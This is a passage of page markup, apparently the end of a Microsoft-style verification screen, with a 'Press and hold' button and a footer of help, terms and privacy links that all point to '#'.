5" stroke="#fff" stroke-width="2" stroke-linecap="round"></path></svg></div><button style="position: relative; flex: 1 1 0%; height: 44px; border: 1.5px solid rgb(0, 120, 212); border-radius: 22px; background: rgb(255, 255, 255); color: rgb(0, 120, 212); font: 600 15px / 40px &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif; cursor: pointer; overflow: hidden; outline: none; user-select: none; transition: background 0.2s ease 0s, border-color 0.2s ease 0s; touch-action: none;"><div style="position: absolute; left: 0px; top: 0px; height: 100%; width: 0%; background: rgba(0, 120, 212, 0.12); border-radius: 22px; transition: none 0s ease 0s; pointer-events: none;"></div><span style="position: relative; z-index: 1; pointer-events: none;">Press and hold</span></button></div></div></div><div style="position: relative; z-index: 1; text-align: center; padding: 24px 16px 20px; margin-top: auto;"><div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin-bottom: 10px;"><a href="#" style="font-size: 12px; color: rgba(255, 255, 255, 0.55); text-decoration: none; transition: color 0.15s ease 0s;">Help and feedback</a><a href="#" style="font-size: 12px; color: rgba(255, 255, 255, 0.55); text-decoration: none; transition: color 0.15s ease 0s;">Terms of use</a><a href="#" style="font-size: 12px; color: rgba(255, 255, 255, 0.55); text-decoration: none; transition: color 0.15s ease 0s;">Privacy and cookies</a></div><div style="font-size: 11px; color: rgba(255, 255, 255, 0.35);">Use private browsing if this is not your device. <a href="#" style="color:#4fc3f7;text-decoration:none">Learn more</a></div></div></body></html>
